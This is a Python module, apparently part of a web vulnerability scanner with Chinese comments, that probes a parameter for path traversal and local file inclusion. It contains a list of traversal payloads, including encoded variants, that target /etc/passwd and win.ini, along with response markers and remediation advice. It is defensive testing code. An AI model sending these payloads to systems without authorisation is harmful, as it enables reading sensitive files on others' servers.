"""路径遍历 / 本地文件包含(LFI)检测器：探测能否读到系统文件。仅对授权目标使用。"""
from typing import List

from ..models import Target, Finding
from .base import Detector


# 不同深度的穿越前缀（含基础编码变体）
PREFIXES = [
    "../../../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//etc/passwd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "../../../../../../../../windows/win.ini",
]
MARKERS = ["root:x:", "bin/bash", "[fonts]", "for 16-bit app support"]


class PathTraversalDetector(Detector):
    name = "path_traversal"
    severity = "High"

    async def scan(self, target: Target) -> List[Finding]:
        if target.is_site:
            return []
        for p in PREFIXES:
            try:
                resp = await self._get(target, target.original + p)
            except Exception:
                continue
            if resp.error:
                continue
            hit = next((m for m in MARKERS if m in resp.body), None)
            if hit:
                return [Finding(
                    detector=PathTraversalDetector.name,
                    severity=PathTraversalDetector.severity,
                    url=target.url, param=target.param, payload=p,
                    evidence=f"响应包含系统文件特征: {hit!r}",
                    description="参数疑似被拼接到文件路径中，可穿越目录读取任意文件。",
                    recommendation="对文件路径做规范化（resolve 后校验是否在允许根目录内）；"
                                   "禁止用户直接控制路径；用资源 ID 映射替代原始路径。",
                )]
        return []
